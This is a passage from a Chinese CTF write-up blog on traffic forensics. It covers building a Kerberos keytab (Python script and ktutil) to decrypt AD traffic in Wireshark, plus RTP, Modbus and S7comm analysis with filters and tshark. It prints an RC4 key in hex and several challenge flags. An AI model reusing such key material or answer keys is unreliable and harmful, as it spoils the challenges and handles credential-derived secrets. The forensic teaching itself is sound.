</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>restfields</span> <span class=o>=</span> <span class=n>KeyTabContentRest</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>getData</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=p>[</span><span class=s1>&#39;num_components&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>components</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1># We modify the data field to be able to use the</span>
</span></span><span class=line><span class=cl>        <span class=c1># parent class parsing</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=p>[</span><span class=s1>&#39;components&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=n>component</span><span class=o>.</span><span class=n>getData</span><span class=p>()</span> <span class=k>for</span> <span class=n>component</span> <span class=ow>in</span> <span class=bp>self</span><span class=o>.</span><span class=n>components</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=p>[</span><span class=s1>&#39;restdata&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>restfields</span><span class=o>.</span><span class=n>getData</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>Structure</span><span class=o>.</span><span class=n>getData</span><span class=p>(</span><span class=bp>self</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>data</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>KeyTabEntry</span><span class=p>(</span><span class=n>Structure</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>structure</span> <span class=o>=</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s1>&#39;size&#39;</span><span class=p>,</span><span class=s1>&#39;&gt;I-content&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s1>&#39;content&#39;</span><span class=p>,</span><span class=s1>&#39;:&#39;</span><span class=p>,</span> <span class=n>KeyTabContent</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Add your own keys here!</span>
</span></span><span class=line><span class=cl><span class=c1># Keys are tuples in the form (keytype, &#39;hexencodedkey&#39;)</span>
</span></span><span class=line><span class=cl><span class=c1># Common keytypes for Windows:</span>
</span></span><span class=line><span class=cl><span class=c1># 23: RC4</span>
</span></span><span class=line><span class=cl><span class=c1># 18: AES-256</span>
</span></span><span class=line><span class=cl><span class=c1># 17: AES-128</span>
</span></span><span class=line><span class=cl><span class=c1># Wireshark takes any number of keys in the keytab, so feel free to add</span>
</span></span><span class=line><span class=cl><span class=c1># krbtgt keys, service keys, trust keys etc</span>
</span></span><span class=line><span class=cl><span class=n>keys</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=p>(</span><span class=mi>23</span><span class=p>,</span> <span class=s1>&#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=p>(</span><span class=mi>18</span><span class=p>,</span> <span class=s1>&#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=p>(</span><span class=mi>17</span><span class=p>,</span> <span class=s1>&#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=p>(</span><span class=mi>18</span><span class=p>,</span> <span class=s1>&#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=p>(</span><span class=mi>23</span><span class=p>,</span> <span class=s1>&#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>nkt</span> <span class=o>=</span> <span class=n>KeyTab</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>nkt</span><span class=o>.</span><span class=n>entries</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>key</span> <span class=ow>in</span> <span class=n>keys</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>ktcr</span> <span class=o>=</span> <span class=n>KeyTabContentRest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>ktcr</span><span class=p>[</span><span class=s1>&#39;keytype&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>key</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>ktcr</span><span class=p>[</span><span class=s1>&#39;key&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>binascii</span><span class=o>.</span><span class=n>unhexlify</span><span class=p>(</span><span class=n>key</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>nktcontent</span> <span class=o>=</span> <span class=n>KeyTabContent</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>nktcontent</span><span class=o>.</span><span class=n>restfields</span> <span class=o>=</span> <span class=n>ktcr</span>
</span></span><span class=line><span class=cl>    <span class=c1># The realm here doesn&#39;t matter for wireshark but does of course for a real keytab</span>
</span></span><span class=line><span class=cl>    <span class=n>nktcontent</span><span class=p>[</span><span class=s1>&#39;realm&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;TESTSEGMENT.LOCAL&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>krbtgt</span> <span class=o>=</span> <span class=n>OctetString</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>krbtgt</span><span class=p>[</span><span class=s1>&#39;value&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;krbtgt&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>nktcontent</span><span class=o>.</span><span class=n>components</span> <span class=o>=</span> <span class=p>[</span><span class=n>krbtgt</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>nktentry</span> <span class=o>=</span> <span class=n>KeyTabEntry</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>nktentry</span><span class=p>[</span><span class=s1>&#39;content&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>nktcontent</span>
</span></span><span class=line><span class=cl>    <span class=n>nkt</span><span class=o>.</span><span class=n>entries</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>nktentry</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=n>nkt</span><span class=o>.</span><span class=n>getData</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Usage: keytab.py &lt;outputfile&gt;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Keys should be written to the source manually&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>outfile</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>outfile</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>data</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>方法三：在 Linux 下使用 ktutil 命令制作 keytab</p><p>参考文章：https://tipi-hack.github.io/2023/01/22/insomnihack-teaser-autopsy.html#the-dcerpc-decryption-problem</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ktutil
</span></span><span class=line><span class=cl>ktutil:  addent -p adm-drp@inscorp.com -k <span class=m>1</span> -key -e rc4-hmac
</span></span><span class=line><span class=cl>Key <span class=k>for</span> adm-drp@inscorp.com <span class=o>(</span>hex<span class=o>)</span>: 5c4dbe6a8a44446f8d2899ff08ea14f2
</span></span><span class=line><span class=cl>ktutil:  wkt ins.keytab
</span></span><span class=line><span class=cl>ktutil:  q</span></span></code></pre></td></tr></table></div></div><p>例题1-<a href=https://goodlunatic.github.io/posts/02298dd/ target=_blank rel="external nofollow noopener noreferrer">2025 华为杯中国研究生网络安全创新大赛实网对抗赛 EZ_ATEXEC</a></p><p>例题2-<a href=https://1cepeak.cn/posts/yqds2024-writeup/#ez_ad target=_blank rel="external nofollow noopener noreferrer">2024 中央企业网络安全大赛 EZ_AD</a></p><p>例题3-<a href=https://z3n1th1.com/2025/01/suctf2025-writeup/#su_ad target=_blank rel="external nofollow noopener noreferrer">2024 SUCTF SU_AD</a></p><h2 class=heading-element id=ad域流量分析><span>AD域流量分析</span>
<a href=#ad%e5%9f%9f%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=dcerpc-协议><span>DCE/RPC 协议</span>
<a href=#dcerpc-%e5%8d%8f%e8%ae%ae class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>按照 NTLM/Kerberos 解密的流程，解密出来后查看即可，就是这里要注意 wireshark 版本要在 4.0.6 以上，要不然会解码不完整</p><p><img loading=lazy src=/posts/5422d65/imgs/image-20251105145452260.png alt=/posts/5422d65/imgs/image-20251105145452260.png height=1678 width=2893></p><p>然后可以依次到 TaskSchedulerService 的数据包中把完整的数据复制出来</p><p><img loading=lazy src=/posts/5422d65/imgs/image-20251105145456622.png alt=/posts/5422d65/imgs/image-20251105145456622.png height=1678 width=2893></p><p>例题1-<a href=https://goodlunatic.github.io/posts/02298dd/ target=_blank rel="external nofollow noopener noreferrer">2025 华为杯中国研究生网络安全创新大赛实网对抗赛 EZ_ATEXEC</a></p><p>例题2-<a href=https://1cepeak.cn/posts/yqds2024-writeup/#ez_ad target=_blank rel="external nofollow noopener noreferrer">2024 中央企业网络安全大赛 EZ_AD</a></p><p>例题3-<a href=https://z3n1th1.com/2025/01/suctf2025-writeup/#su_ad target=_blank rel="external nofollow noopener noreferrer">2024 SUCTF SU_AD</a></p><h2 class=heading-element id=rtp流量分析><span>RTP流量分析</span>
<a href=#rtp%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>RTP 协议一般用于电话流量当中，可以根据流量中传输数据的特征来判断</p><p><img loading=lazy src=/posts/5422d65/imgs/image-20251105143329850.png alt=/posts/5422d65/imgs/image-20251105143329850.png height=1533 width=2556></p><p>我们需要先在启用的协议里勾选RTP-UDP，然后右键Decode As，改成RTP</p><p>然后到 电话-RTP-RTP流 中去听电话传输的内容即可，如果传的流比较多，可以用 <a href=https://github.com/foreni-packages/rtpbreak target=_blank rel="external nofollow noopener noreferrer">rtpbreak</a> 批量提取出来</p><p>例题1-BUUOJ VOIP</p><p>例题2-2025 SUCTF EZ_VOIP</p><p>例题3-2025 强网杯 谍影重重6.0</p><h2 class=heading-element id=工控流量分析><span>工控流量分析</span>
<a href=#%e5%b7%a5%e6%8e%a7%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>参考连接：https://blog.csdn.net/song123sh/article/details/128387982</p><p>将流量按长度降序排列，然后在各层寻找线索，</p><p>显示分组字节，从base64后开始，然后解码看文件类型，最后显示成该类型</p><h3 class=heading-element id=modbus-协议分析><span>Modbus 协议分析</span>
<a href=#modbus-%e5%8d%8f%e8%ae%ae%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>Modbus 流量主要有三类：Modbus/RTU、Modbus/ASCII、Modbus/TCP</p><p><strong>Modbus/RTU</strong></p><blockquote><p>从机地址1B+功能码1B+数据字段xB+CRC值2B
最大长度256B，所以数据字段最大长度252B</p></blockquote><p><strong>Modbus/ASCII</strong></p><blockquote><p>由Modbus/RTU衍生，采用0123456789ABCDEF 表示原本的从机地址、功能码、数据字段，并添加开始结束标记，所以长度翻倍
开始标记:（0x3A）1B+从机地址2B+功能码2B+数据字段xB+LRC值2B+结束标记\r\n2B
最大长度513B，因为数据字段在RTU中是最大252B，所以在ASCII中最大504B</p></blockquote><p><strong>Modbus/TCP</strong></p><blockquote><p>不再需要从机地址，改用UnitID；不再需要CRC/LRC，因为TCP自带校验
传输标识符2B+协议标识符2B+长度2B+从机ID 1B+功能码1B+数据字段xB</p></blockquote><p>一般题目考察 Modbus/TCP 比较多，然后主要考察的就是下面这种功能码（这里只列了部分）
因此解题的时候配合过滤器一个个功能码看过去就行</p><blockquote><p>1：读线圈
2：读离散输入
3：读保持
4：读输入
5：写单个线圈
6：写单个保持
15：写多个线圈
16：写多个保持</p></blockquote><h4 class=heading-element id=例题1-hngk-modbus流量分析><span>例题1 HNGK-Modbus流量分析</span>
<a href=#%e4%be%8b%e9%a2%981-hngk-modbus%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><p>使用下面这个过滤器命令即可得到 flag</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>(((_ws.col.protocol == &#34;Modbus/TCP&#34;) ) &amp;&amp; (modbus.byte_cnt)) &amp;&amp; (modbus.func_code == 16)</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/5422d65/imgs/image-20240430142133329.png alt=/posts/5422d65/imgs/image-20240430142133329.png height=2160 width=3842>
flag{TheModbusProtocolIsFunny!}</p><h3 class=heading-element id=s7comm-协议分析><span>S7comm 协议分析</span>
<a href=#s7comm-%e5%8d%8f%e8%ae%ae%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><blockquote><p>西门子设备的工控协议，基于 COTP 实现，是COTP的上层协议</p><p>主要有三种类型：Job(1)、Ack_Data(3)/Ack(2)、Userdata(7)</p><p>Job：下发任务/指令</p><p>Ack_Data：带有返回数据</p><p>Ack：单纯确认，含有数据</p><p>Userdata：用户自定义数据区，也包含功能指令</p></blockquote><h4 class=heading-element id=例题1-2020icsc湖州站工控协议数据分析><span>例题1 2020ICSC湖州站—工控协议数据分析</span>
<a href=#%e4%be%8b%e9%a2%981-2020icsc%e6%b9%96%e5%b7%9e%e7%ab%99%e5%b7%a5%e6%8e%a7%e5%8d%8f%e8%ae%ae%e6%95%b0%e6%8d%ae%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><p>首先过滤出S7协议的数据包，发现在一些Ack_Data的数据包中传输了二进制数据
<img loading=lazy src=/posts/5422d65/imgs/image-20240430111822297.png alt=/posts/5422d65/imgs/image-20240430111822297.png height=2160 width=3842>
因此，我们将所有带有二进制数据的数据包都过滤出来，发现一些Job的数据包中也有二进制数据
<img loading=lazy src=/posts/5422d65/imgs/image-20240430112312109.png alt=/posts/5422d65/imgs/image-20240430112312109.png height=2160 width=3842>
然后我们尝试将所有带有二进制数据的Job数据包都过滤出来并导出特定分组，过滤器代码如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>((</span>s7comm<span class=o>)</span> <span class=o>&amp;&amp;</span> <span class=o>(</span>s7comm.resp.data<span class=o>))</span> <span class=o>&amp;&amp;</span> <span class=o>(</span>s7comm.param.func <span class=o>==</span> 0x05<span class=o>)</span></span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/5422d65/imgs/image-20240430112740044.png alt=/posts/5422d65/imgs/image-20240430112740044.png height=2154 width=3838></p><p>然后使用 tshark 提取数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>tshark -r 1.pcap -T fields -e s7comm.resp.data | uniq</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/5422d65/imgs/image-20240430112936680.png alt=/posts/5422d65/imgs/image-20240430112936680.png height=675 width=1731></p><p>最后 CyberChef 解码二进制即可得到 flag
<img loading=lazy src=/posts/5422d65/imgs/image-20240430113016466.png alt=/posts/5422d65/imgs/image-20240430113016466.png height=1197 width=2296></p><h4 class=heading-element id=例题2-2020icsc济南站被篡改的数据><span>例题2 2020ICSC济南站—被篡改的数据</span>
<a href=#%e4%be%8b%e9%a2%982-2020icsc%e6%b5%8e%e5%8d%97%e7%ab%99%e8%a2%ab%e7%af%a1%e6%94%b9%e7%9a%84%e6%95%b0%e6%8d%ae class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><p>翻看流量包，发现很多 S7COMM 数据包，使用过滤器过滤，发现 s7comm.resp.data 字段传了很多 66 数据
使用过滤器过滤出传了 s7comm.resp.data 字段数据但数据不是 66 的 S7 数据包
发现了疑似 flag 的数据，为了防止 flag 中含有 f 字符而被过滤
因此我们使用下面这个过滤命令进行过滤，然后导出特定分组</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=p>(((</span><span class=n>frame</span><span class=o>.</span><span class=n>number</span> <span class=o>&gt;=</span> <span class=mi>19987</span> <span class=o>&amp;&amp;</span> <span class=n>frame</span><span class=o>.</span><span class=n>number</span> <span class=o>&lt;=</span><span class=mi>20032</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>_ws</span><span class=o>.</span><span class=n>col</span><span class=o>.</span><span class=n>protocol</span> <span class=o>==</span> <span class=s2>&#34;S7COMM&#34;</span><span class=p>))</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>s7comm</span><span class=o>.</span><span class=n>param</span><span class=o>.</span><span class=k>func</span> <span class=o>==</span> <span class=mh>0x05</span><span class=p>))</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>s7comm</span><span class=o>.</span><span class=n>resp</span><span class=o>.</span><span class=n>data</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>最后 tshark 提取出数据，然后十六进制解码即可得到 flag：flag{93137ad4a}</p><h4 class=heading-element id=例题3-枢网智盾2021异常流分析><span>例题3 枢网智盾2021—异常流分析</span>
<a href=#%e4%be%8b%e9%a2%983-%e6%9e%a2%e7%bd%91%e6%99%ba%e7%9b%be2021%e5%bc%82%e5%b8%b8%e6%b5%81%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><p>打开流量包，发现很多 S7comm 流量，然后稍微过滤一下，发现是写入数据的流量
然后写入的数据几乎都是 ffff 开头的，因此我们直接查看不是 ffff 开头的数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=p>((</span><span class=n>_ws</span><span class=o>.</span><span class=n>col</span><span class=o>.</span><span class=n>protocol</span> <span class=o>==</span> <span class=s2>&#34;S7COMM&#34;</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>s7comm</span><span class=o>.</span><span class=n>param</span><span class=o>.</span><span class=k>func</span> <span class=o>==</span> <span class=mh>0x05</span><span class=p>))</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>s7comm</span><span class=o>.</span><span class=n>resp</span><span class=o>.</span><span class=n>data</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>2</span><span class=p>]</span> <span class=o>!=</span> <span class=n>ff</span><span class=p>:</span><span class=n>ff</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>即可得到 flag：flag{ffad28a0ce69db34751f}</p><h4 class=heading-element id=例题4-枢网智盾2021工控协议分析><span>例题4 枢网智盾2021—工控协议分析</span>
